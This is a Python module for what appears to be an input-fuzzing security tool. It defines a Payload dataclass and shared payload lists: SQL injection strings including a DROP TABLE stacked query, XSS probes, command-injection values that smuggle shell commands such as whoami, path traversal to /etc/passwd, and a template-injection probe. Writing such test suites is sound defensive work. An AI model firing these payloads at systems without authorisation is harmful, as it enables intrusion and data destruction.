"""Core payload types plus shared payload sets used across field types."""

from dataclasses import dataclass
from enum import Enum


class PayloadCategory(Enum):
    BOUNDARY = "boundary"   # valid-but-edge inputs
    ATTACK = "attack"       # malicious inputs probing for vulnerabilities


@dataclass(frozen=True)
class Payload:
    """One test input to send to a field.

    `value` is what we actually type; `category` and `vuln` describe what
    we're testing so the analyzer (and the report) know what a hit means.
    """

    value: str
    category: PayloadCategory
    vuln: str               # short tag: "sqli", "xss", "overflow", ...
    description: str = ""


# --- Shared payload sets -------------------------------------------------
# These apply to almost any text-accepting field, so multiple generators
# reuse them rather than redefining the same strings.

SQLI = [
    Payload("' OR '1'='1", PayloadCategory.ATTACK, "sqli", "Classic auth-bypass"),
    Payload("' OR 1=1--", PayloadCategory.ATTACK, "sqli", "Comment-terminated bypass"),
    Payload("'; DROP TABLE users--", PayloadCategory.ATTACK, "sqli", "Stacked query"),
    Payload("\" OR \"\"=\"", PayloadCategory.ATTACK, "sqli", "Double-quote variant"),
    Payload("1' AND SLEEP(5)--", PayloadCategory.ATTACK, "sqli", "Time-based blind"),
]

XSS = [
    Payload("<script>alert(1)</script>", PayloadCategory.ATTACK, "xss", "Basic script tag"),
    Payload("\"><img src=x onerror=alert(1)>", PayloadCategory.ATTACK, "xss", "Attribute breakout"),
    Payload("javascript:alert(1)", PayloadCategory.ATTACK, "xss", "JS URI"),
    Payload("'><svg/onload=alert(1)>", PayloadCategory.ATTACK, "xss", "SVG event handler"),
]

COMMAND_INJECTION = [
    Payload("; ls -la", PayloadCategory.ATTACK, "cmdi", "Command separator"),
    Payload("| whoami", PayloadCategory.ATTACK, "cmdi", "Pipe to command"),
    Payload("`id`", PayloadCategory.ATTACK, "cmdi", "Backtick substitution"),
    Payload("$(sleep 5)", PayloadCategory.ATTACK, "cmdi", "Subshell time-delay"),
]

PATH_TRAVERSAL = [
    Payload("../../../../etc/passwd", PayloadCategory.ATTACK, "path", "Unix traversal"),
    Payload("..\\..\\..\\windows\\win.ini", PayloadCategory.ATTACK, "path", "Windows traversal"),
]

# Boundary inputs that stress generic text handling.
GENERIC_BOUNDARY = [
    Payload("", PayloadCategory.BOUNDARY, "empty", "Empty submission"),
    Payload(" ", PayloadCategory.BOUNDARY, "whitespace", "Whitespace only"),
    Payload("A" * 5000, PayloadCategory.BOUNDARY, "overflow", "Very long input"),
    Payload("𝕊🔥💀ñé中文", PayloadCategory.BOUNDARY, "unicode", "Multi-byte unicode"),
    Payload("%00", PayloadCategory.BOUNDARY, "nullbyte", "Null byte"),
    Payload("{{7*7}}", PayloadCategory.ATTACK, "ssti", "Template injection probe"),
]
